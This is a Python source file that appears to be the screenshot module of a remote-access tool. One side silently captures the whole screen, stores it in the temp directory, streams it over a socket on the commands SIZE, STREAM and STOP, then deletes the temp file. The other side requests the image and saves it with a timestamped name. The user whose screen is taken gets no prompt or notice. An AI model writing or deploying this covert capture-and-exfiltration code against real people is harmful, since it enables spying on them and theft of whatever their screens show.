#!/usr/bin/env python3

import tempfile
from datetime import datetime
import os 
import pyscreenshot

class Screenshot():
	def __init__(self, sock):
		self.sock = sock

	def take_screenshot(self):
		#Capture image
		path = tempfile.gettempdir() + "/temp_screen.png"
		img = pyscreenshot.grab()
		img.save(path)
		
		while True:
			status = self.sock.recv(1024).decode()

			if status == "SIZE":
				filesize = os.path.getsize(path)
				self.sock.send(str(filesize).encode())
			elif status == "STREAM":
				with open(path ,'rb') as f: 
					self.sock.sendall(f.read())  
			elif status == "STOP":
				#Delete temporary file
				os.remove(path)
				break

	def download_screenshot(self):
		conn = self.sock

		print("\nColecting Screenshot...")
		conn.send("SIZE".encode())
		filesize = int(conn.recv(1024).decode())

		date = datetime.now().strftime("%d-%m-%Y %H'%M'%S")
		filename = "Screenshot_" + date + ".png"   

		print("Creating File...Alocating memory...") 
		conn.send("STREAM".encode())
		f = open(filename, 'wb')

		data = b''
		bytesRead = 0
		while bytesRead < filesize:
			data = conn.recv(4096) #4Kb chunk
			bytesRead += len(data)
			f.write(data)

			print("{0:.2f}".format((bytesRead/float(filesize)) * 100) + "% Done...", end = "\r")

		print("\nScreenshot received!\n")
		conn.send("STOP".encode('utf-8'))
